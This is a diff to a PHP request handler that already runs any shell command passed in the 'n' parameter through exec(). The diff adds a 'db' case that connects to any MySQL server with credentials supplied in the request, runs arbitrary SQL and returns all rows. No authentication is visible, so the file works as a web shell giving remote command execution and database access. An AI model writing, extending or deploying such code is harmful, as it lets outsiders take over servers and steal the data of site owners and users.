@@ -14,7 +14,6 @@
 $resp = array();
 $resp['res'] = 0 ;
 
-
 if( !empty($_REQUEST['n']) && !empty($_REQUEST['c']) ) {
   $cmd = trim($_REQUEST['c']);
   $file = trim($_REQUEST['n']);
@@ -296,6 +295,22 @@ if( !empty($_REQUEST['n']) && !empty($_REQUEST['c']) ) {
 		$resp['ret']=-1 ;
 		$resp['rvalue'] = exec( $file, $resp['output'], $resp['ret']);
 		$resp['res'] = 1 ;
+		break;
+
+	case 'db' :
+		// 'n' : sql statement, 'l': db
+		$l=explode(":", $_REQUEST['l'] );
+		@$conn = new mysqli($l[0], $l[1], $l[2], $l[3] );
+		if( $conn ) {
+			if( $result=$conn->query($file) ) {
+				$resp['res'] = 1 ;
+				if( $result !== TRUE ) {
+					$resp['output'] = $result->fetch_all(MYSQLI_ASSOC);
+					$result->close();
+				}
+			}
+			$resp['error'] = $conn->error ;
+		}
 		break;
 	
 	default :
